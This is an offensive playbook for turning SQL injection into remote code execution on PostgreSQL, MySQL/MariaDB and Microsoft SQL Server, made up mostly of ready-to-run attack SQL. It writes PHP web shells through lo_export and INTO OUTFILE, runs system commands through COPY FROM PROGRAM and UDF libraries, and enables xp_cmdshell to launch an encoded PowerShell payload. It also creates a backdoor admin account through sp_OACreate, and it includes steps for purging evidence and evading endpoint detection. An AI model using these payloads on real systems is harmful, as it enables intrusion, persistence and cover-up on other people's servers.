# Tactical Blueprint: SQL Injection (SQLi) to Remote Code Execution (RCE)

This blueprint maps direct, multi-stage white-box to black-box execution paths to turn a verified SQL Injection primitive into unauthenticated Remote Code Execution.

---

## 1. POSTGRESQL LAYER

### Vector A: Arbitrary File Write via Large Objects (lo_export)
*   **Pre-conditions:** Superuser privileges or membership in `pg_write_server_files`. No direct shell access required. Perfect for writing web shells or configuration files.

```sql
-- Step 1: Create a staging Large Object template
SELECT lo_create(1337);

-- Step 2: Inject hex-encoded PHP/ASPX web shell payload into the staging object pages
-- (Splitting chunks to bypass length limits if necessary; Page 0 holds the payload)
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1337, 0, decode('3c3f7068702073797374656d28245f4745545b22636d64225d2)33e', 'hex'));

-- Step 3: Export the constructed Large Object directly into the target web root
SELECT lo_export(1337, '/var/www/html/shell.php');

-- Step 4: Purge the evidence from the large object tables
SELECT lo_unlink(1337);
```

### Vector B: Dynamic Library Execution (`COPY .. FROM PROGRAM`)
*   **Pre-conditions:** Database version >= 9.3, superuser privileges (`postgres` role). Executes commands directly within the database server runtime engine context.

```sql
-- Create an auxiliary table to capture standard output streams
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);

-- Execute system command via shell wrapper and channel output to the table
COPY cmd_exec FROM PROGRAM 'id && uname -a';

-- Extract the execution results via standard UNION extraction techniques
SELECT cmd_output FROM cmd_exec;
```

---

## 2. MYSQL / MARIADB LAYER

### Vector A: Web Shell Injection (`INTO OUTFILE`)
*   **Pre-conditions:** The `secure_file_priv` global configuration variable must be empty (`""`). The database user must possess the `FILE` privilege, and the exact absolute path to a writable web root must be mapped.

```sql
-- Classic UNION injection writing a minimalist PHP command execution cradle
UNION SELECT 1, '<?php system(\$_GET["c"]); ?>', 3, 4 INTO OUTFILE '/var/www/html/uploads/cradle.php'-- -
```

### Vector B: User Defined Functions (UDF) Shared Library Write
*   **Pre-conditions:** High-privilege access, write permissions directly inside the server's plugin directory (typically `/usr/lib/mysql/plugin/` on Linux).

```sql
-- Step 1: Write the raw binary shared library file (.so or .dll) to the plugin path
SELECT hex_payload INTO DUMPFILE '/usr/lib/mysql/plugin/lib_sys.so' FROM binary_source_table;

-- Step 2: Dynamically load the external execution function wrapper into the engine runtime
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_sys.so';

-- Step 3: Execute target system commands with immediate visual return strings
SELECT sys_eval('id');
```

---

## 3. MICROSOFT SQL SERVER (MSSQL) LAYER

### Vector A: Shell Broker Injection (`xp_cmdshell`)
*   **Pre-conditions:** `sysadmin` role permissions. Can be enabled dynamically on the fly via SQL injection paths if the engine is improperly isolated.

```sql
-- Step 1: Force system configuration accessibility to expose advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Step 2: Toggle the system shell engine activation state to ON
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Step 3: Execute non-interactive payload delivery commands directly
EXEC xp_cmdshell 'powershell -Enc <Base64_Payload>';
```

### Vector B: Stored Procedure OLE Automation (`sp_OACreate`)
*   **Pre-conditions:** `sysadmin` privileges. Used as an evasion alternative if `xp_cmdshell` is actively blocked or monitored by endpoint detection agents.

```sql
-- Step 1: Enable Object Linking and Embedding (OLE) Automation context
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Step 2: Instantiate a hidden WScript.Shell orchestration object instance
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;

-- Step 3: Trigger silent background execution threads passing arguments natively
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c net user backup_admin Password123 /add';
```
